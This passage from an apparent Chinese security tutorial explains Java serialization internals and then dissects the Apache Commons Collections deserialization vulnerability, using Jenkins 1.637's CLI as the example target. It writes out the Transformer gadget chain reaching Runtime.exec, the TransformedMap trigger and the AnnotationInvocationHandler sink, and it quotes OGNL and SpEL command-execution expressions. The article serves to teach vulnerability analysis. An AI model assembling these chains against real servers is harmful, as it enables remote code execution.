class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String replacementField;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SerializationReplacementClass(<span class="string">"resolve"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SerializationReplacementClass</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.replacementField = s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SerializationReplacementClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.replacementField = <span class="string">"replace"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">writeReplace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SerializationReplacementClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// omit</span></span><br><span class="line">        SerializationReplacementClass demo = (SerializationReplacementClass) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从序列化之后得到的二进制串中可以看到目标对象已经被替换成了<code>SerializationReplacementClass</code>：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 1d  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 52 65 70  6c 61 63 65 6d 65 6e 74    ationRep lacement</span><br><span class="line">43 6c 61 73 73 32 71 ac  e9 c1 d3 0b 7b 02 00 01    Class2q. ....&#123;...</span><br><span class="line">4c 00 10 72 65 70 6c 61  63 65 6d 65 6e 74 46 69    L..repla cementFi</span><br><span class="line">65 6c 64 74 00 12 4c 6a  61 76 61 2f 6c 61 6e 67    eldt..Lj ava&#x2F;lang</span><br><span class="line">2f 53 74 72 69 6e 67 3b  78 70 74 00 07 72 65 70    &#x2F;String; xpt..rep</span><br><span class="line">6c 61 63 65                                         lace</span><br></pre></td></tr></table></figure></div>

<p>而在反序列化之后得到的对象的<code>replacementField</code>字段值则为<code>resolve</code>，但在此之前<code>readObject()</code>也会被正常调用，当时<code>replacementField</code>字段值为<code>replace</code>。</p>
<h3 id="关于Externalizable"><a href="#关于Externalizable" class="headerlink" title="关于Externalizable"></a>关于<code>Externalizable</code></h3><p><code>Serializable</code>接口还有一个比较常见的子类<code>Externalizable</code>，它比它爸爸特殊的地方就在于它需要自己实现读写方法 <em>（<code>readExternal()</code>和<code>writeExternal()</code>）</em> ，同时必须包含一个自己的无参构造方法 <em>（默认隐式的也可以）</em> 。</p>
<p>仍以示例说话：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExternalizationDemo</span> <span class="keyword">implements</span> <span class="title">Externalizable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stringField;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.writeUTF(<span class="keyword">this</span>.stringField);</span><br><span class="line">        out.writeInt(<span class="keyword">this</span>.intField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = <span class="string">"hello, i'm "</span> + in.readUTF();</span><br><span class="line">        <span class="keyword">this</span>.intField = in.readInt() + <span class="number">100000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExternalizationDemo</span><span class="params">(String s, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = s;</span><br><span class="line">        <span class="keyword">this</span>.intField = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExternalizationDemo</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>序列化之后得到的二进制串如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 13  45 78 74 65 72 6e 61 6c    ....sr.. External</span><br><span class="line">69 7a 61 74 69 6f 6e 44  65 6d 6f d9 a9 04 75 84    izationD emo...u.</span><br><span class="line">5d 06 8f 0c 00 00 78 70  77 0b 00 05 67 79 79 79    ].....xp w...gyyy</span><br><span class="line">79 00 01 7d f1 78                                   y..&#125;.x</span><br></pre></td></tr></table></figure></div>

<p>与<code>Serializable</code>的区别：</p>
<ul>
<li>对象的序列化属性标志位为<code>0x0c</code>，包括<code>Serializable</code>和Block Data的标志</li>
<li>序列化类的字段个数固定为0</li>
<li>序列化调用<code>writeExternalData()</code>转给类自定义的写方法，将写入的数据包装在新的Block Data块中，第一个字节为块长度 <em>（不含块头尾标识）</em></li>
<li>反序列化调用<code>readExternalData()</code>转给类自定义的读方法，再调用对象的无参构造方法 <em>（若不存在，则返回<code>null</code>）</em> 进行实例化</li>
</ul>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>通过以上对Java的序列化机制的大致了解，我们可以想象一个场景 <em>（有基础的同学可以跳过本部分内容，当然，看一看也没坏处）</em> ：</p>
<blockquote>
<p>当服务端允许接收远端数据进行反序列化时，客户端可以提供任意一个服务端存在的对象 <em>（包括依赖包中的对象）</em> 的序列化二进制串，由服务端反序列化成相应对象。如果该对象是由攻击者『精心构造』的恶意对象，而它自定义的<code>readObject()</code>中存在着一些『不安全』的逻辑，那么在对它反序列化时就有可能出现安全问题。</p>
</blockquote>
<p>说到这，我提三个问题，请大家跟着我的思路去分析，先来看看第一个：</p>
<ol>
<li>为什么需要依赖反序列化对象的自定义<code>readObject()</code>？</li>
</ol>
<p>大家都知道，正常来说，反序列化只是一个对象实例化然后赋值的过程，如果之后不主动调用它的内部方法，理论上最多只能控制它字段的值而已。那么有没有什么办法能够让它执行反序列化以外的逻辑呢？毕竟做的越多中间产生问题的概率就越大。</p>
<p>我们还是先以大家更熟悉的PHP来举个例。在PHP内部，保留了十多个被称为魔术方法的类方法，这些魔术方法一般会伴随着类的生命周期被PHP底层自动调用，用户可以在类中显式定义它们的逻辑。</p>
<p>就拿与反序列化关系最密切的<code>__wakeup()</code>来说，我们回到最初的那个类<code>SerializationDemo</code>，给它加一点东西：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;stringField;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在反序列化<code>SerializationDemo</code>这个对象时，就会调用<code>__wakeup()</code>执行里面的逻辑。示例中的逻辑只是输出一个字符串，如果改成<code>exec($this-&gt;stringField);</code>呢？</p>
<p>实际当然不会这么简单，有可能它是把自己的字段作为值作为参数调用了某个类的方法，而那个方法里对参数做了某些不安全的操作，甚至有可能经过多个类多个方法调用，形成一个调用链。</p>
<p>这就是默认的反序列化逻辑的一个逃逸过程。</p>
<p>到这里你可能已经想到了，Java反序列化中<code>readObject()</code>的作用其实就相当于PHP反序列化中的那些魔术方法，使反序列化过程在一定程度上受控成为可能，但也只是可能而已，是否真的可控，还是需要分析每个对象的<code>readObject()</code>具体是如何实现的 <em>（别急，后面有章节会有详细介绍）</em> 。</p>
<p>接着看第二个问题：</p>
<ol start="2">
<li>反序列化对象的非<code>Serializable</code>父类无参构造方法是否能像PHP中的<code>__construct()</code>一样被利用？</li>
</ol>
<p>答案应该是不行的。因为前面已经提到过，我们只能够控制反序列化对象的字段值，而Java与PHP不同的是，JDK底层会先调用无参构造方法实例化，再读取序列化的字段数据赋值，所以我们没有办法将可控的字段值在实例化阶段传入构造方法中对其内部逻辑产生影响。</p>
<p>最后一个：</p>
<ol start="3">
<li><code>readResolve()</code>对反序列化漏洞有什么影响？</li>
</ol>
<p><code>readResolve()</code>只是替换反序列化结果对象，若是结果对象本身存在安全问题，它有可能让问题中断；若是<code>readObject()</code>存在安全问题，它无法避免。</p>
<h3 id="经典的Apache-Commons-Collections"><a href="#经典的Apache-Commons-Collections" class="headerlink" title="经典的Apache Commons Collections"></a>经典的Apache Commons Collections</h3><p>好，有了上面的基础，我们也照一回惯例，带大家一起分析一下Java历史上最出名也是最具代表性的Apache Commons Collections反序列化漏洞。</p>
<p>网上很多文章都是以WebLogic为漏洞环境，我们尊重开源，围绕1.637版本的Jenkins来开个头，先简单看看它的Cli组件的反序列化场景 <em>（这里只以CLI-connect协议为例，CLI2-connect会多出来一个SSL加解密的过程，这也是很多公开PoC在模拟Cli握手时选择CLI-connect协议的原因）</em> ：</p>
<ol>
<li>客户端向发送一个UTF8字符串<code>Protocol:CLI-connect</code>，前两位为字符串长度</li>
<li>服务端<code>TcpSlaveAgentListener</code>在接收到数据之后，会创建一个<code>ConnectionHandler</code>对象读取一个UTF8字符串，判断协议版本，交给对应的协议进行处理<ul>
<li><code>CliProtocol</code>响应<code>Welcome</code>字符串，由<code>ChannelBuilder</code>为两端创建一个包含了<code>Connection</code>对象 <em>（IO流对象在里面）</em> 的<code>Channel</code>通信通道，并调用<code>negotiate()</code>进行交互<ul>
<li><code>Capability.writePreamble()</code>响应序列化后的<code>Capability</code>对象，其中使用<code>Mode.TEXT.wrap()</code>将输出流包装为<code>BinarySafeStream</code>，它会在写时进行Base64编码</li>
<li>由于<code>ChannelBuilder</code>在build之前，调用了<code>withMode()</code>设置<code>mode</code>为<code>Mode.BINARY</code>，因此还会响应一个<code>0x00000000</code></li>
<li>等待接收后续数据，判断数据内容前缀为<code>Capability.PREAMBLE</code> <em>（<code>&lt;===[JENKINS REMOTING CAPACITY]===&gt;</code>）</em> 时，将<code>InputStream</code>传给<code>Capability.read()</code><ul>
<li><code>Capability</code>同样会对输入流做一次<code>BinarySafeStream</code>包装，保证在读数据时解码得到原始二进制数据，再扔给输入流的<code>readObject()</code>继续读</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>回看<code>Connection</code>中自定义的<code>readObject()</code>，是一个普普通通的<code>ObjectInputStream</code>反序列化：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">    <span class="keyword">return</span> (T)ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>现在我们假设已知1.637版本的Jenkins引用了存在反序列化漏洞的Commons Collections的版本的Jar包，那么只需要利用它构造一个恶意对象的序列化串，在与Jenkins Cli完成握手之后，将其Base64编码后的字符串发送过去就行了 <em>（当然，千万别忘了前面那串酷酷的前缀）</em> 。</p>
<hr>
<h2 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h2><p>好的，现在让我们聚焦到Commons Collections内部，看看前辈们是如何利用它来让应用『产生』问题的。</p>
<p>我们先预备一个基本知识，在Java中，若想通过其原生JDK提供的接口执行系统命令，最常见的语句如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime rt = Runtime.getRuntime();</span><br><span class="line">rt.exec(cmd);</span><br></pre></td></tr></table></figure></div>

<p>很简单，一个单例模式的方法获取到<code>Runtime</code>的实例，再调用它的<code>exec()</code>执行命令。在表达式注入类RCE漏洞中也可以频繁看到利用各种条件特性来构造这段语句的身影，比如Struts2的OGNL：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(cmd)</span><br></pre></td></tr></table></figure></div>

<p>又比如Spring的SpEL：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure></div>

<p>这里替小白问个基础但又和接下来的内容有关的问题：为什么都要使用链式结构？</p>
<p>原因其实很简单，因为无论是表达式解析执行还是反序列化时，底层通过反射技术获取对象调用函数都会存在一个上下文环境，使用链式结构的语句可以保证执行过程中这个上下文是一致的。你也可以换个方式问自己，如果你第一次请求<code>Runtime.getRuntime()</code>，那如何保证第二次请求<code>rt.exec()</code>能够拿到第一次的<code>Runtime</code>对象呢？</p>
<p>了解了这个问题之后，我们就可以开始尝试用Commons Collections先来构造这个链式结构了。</p>
<p>前辈们为我们在Commons Collections中找到了一个用于对象之间转换的<code>Transformer</code>接口，它有几个我们用得着的实现类：</p>
<ol>
<li><code>ConstantTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><code>InvokerTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><code>ChainedTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

</li>
</ol>
<p>利用这几个对象，可以构造出下面这条链：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; "getRuntime", new Class[0] &#125;),</span><br><span class="line">        new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; cmd &#125;)&#125;;</span><br><span class="line">Transformer chain = <span class="keyword">new</span> ChainedTransformer(trans);</span><br></pre></td></tr></table></figure></div>

<p>其中，数组的中间两个元素是最让人费解的，我们一句一句来解释 <em>（前方高能预警，请对照上面几个<code>Transformer</code>的逻辑仔细看，接下来的内容网上有些解释是存在出入的）</em> ：</p>
<ol>
<li>构造一个<code>ConstantTransformer</code>，把<code>Runtime</code>的<code>Class</code>对象传进去，在<code>transform()</code>时，始终会返回这个对象</li>
<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>getMethod</code>，参数为<code>getRuntime</code>，在<code>transform()</code>时，传入1的结果，此时的<code>input</code>应该是<code>java.lang.Runtime</code>，但经过<code>getClass()</code>后，<code>cls</code>为<code>java.lang.Class</code>，之后的<code>getMethod()</code>只能获取<code>java.lang.Class</code>的方法，因此才会定义的待调用方法名为<code>getMethod</code>，然后其参数才是<code>getRuntime</code>，它得到的是<code>getMethod</code>这个方法的<code>Method</code>对象，<code>invoke()</code>调用这个方法，最终得到的才是<code>getRuntime</code>这个方法的<code>Method</code>对象</li>
<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>invoke</code>，参数为空，在<code>transform()</code>时，传入2的结果，同理，<code>cls</code>将会是<code>java.lang.reflect.Method</code>，再获取并调用它的<code>invoke</code>方法，实际上是调用上面的<code>getRuntime()</code>拿到<code>Runtime</code>对象</li>
<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>exec</code>，参数为命令字符串，在<code>transform()</code>时，传入3的结果，获取<code>java.lang.Runtime</code>的<code>exec</code>方法并传参调用</li>
<li>最后把它们组装成一个数组全部放进<code>ChainedTransformer</code>中，在<code>transform()</code>时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求</li>
</ol>
<p>既然第2、3步这么绕，我们又知道了为什么，是不是可以考虑用下面这种逻辑更清晰的方式来构造呢：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; cmd &#125;)&#125;;</span><br></pre></td></tr></table></figure></div>

<p>答案是不行的。虽然单看整个链，无论是定义还是执行都是没有任何问题的，但是在后续序列化时，由于<code>Runtime.getRuntime()</code>得到的是一个对象，这个对象也需要参与序列化过程，而<code>Runtime</code>本身是没有实现<code>Serializable</code>接口的，所以会导致序列化失败。</p>
<p>也有同学可能看过ysoserial构造的Payload，它的习惯是先定义一个包含『无效』<code>Transformer</code>的<code>ChainedTransformer</code>，等所有对象装填完毕之后再利用反射将实际的数组放进去。这么做的原因作者也在一个<a href="https://github.com/frohoff/ysoserial/issues/32" target="_blank" rel="noopener">Issue</a>中给了解释，我们直接看原文：</p>
<blockquote>
<p>Generally any reflection at the end of gadget-chain set up is done to “arm” the chain because constructing it while armed can result in premature “detonation” during set-up and cause it to be inert when serialized and deserialized by the target application.</p>
</blockquote>
<p>现在，有了这条<code>Transformer</code>链，就等着谁来执行它的<code>transform()</code>了。</p>
<p>网上流传的示例很多都是使用一个名为<code>TransformedMap</code>的装饰器来触发<code>transform()</code>，它在装饰时会传入原始<code>Map</code>、一个键转换器<code>Transformer</code>和一个值转换器<code>Transformer</code>，而它的父类在内部实现了一个<code>AbstractMapEntryDecorator</code>的子类，会在<code>setValue()</code>前调用<code>checkSetValue()</code>进行检查，而<code>TransformedMap.checkSetValue()</code>会调用它的值转换器的<code>transform()</code>，因此装饰任意一个有元素的<code>Map</code>就可以满足需求：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map m = TransformedMap.decorate(<span class="keyword">new</span> HashMap()&#123;&#123; put(<span class="string">"value"</span>, <span class="string">"anything"</span>); &#125;&#125;, <span class="keyword">null</span>, chain);</span><br></pre></td></tr></table></figure></div>

<p>这时，我们只需要再找一个包含可控<code>Map</code>字段，并会在反序列化时对这个<code>Map</code>进行<code>setValue()</code>或<code>get()</code>操作的公共对象。</p>
<p>幸运的是，前辈们在JDK较早的版本中发现了<code>AnnotationInvocationHandler</code>这个对象 <em>（较新版本的JDK可以使用<code>BadAttributeValueExpException</code>，在这里就不展开了）</em> ，它在初始化时可以传入一个<code>Map</code>类型参数赋值给字段<code>memberValues</code>，<code>readObject()</code>过程中如果满足一定条件就会对<code>memberValues</code>中的元素进行<code>setValue()</code>：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    s.<span class="title">defaultReadObject</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                    value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到，在遍历<code>memberValues.entrySet()</code>时，会用键名在<code>memberTypes</code>中尝试获取一个<code>Class</code>，并判断它是否为<code>null</code>，这就是刚才说的需要满足的条件。接下来是网上很少提到过的一个结论：</p>
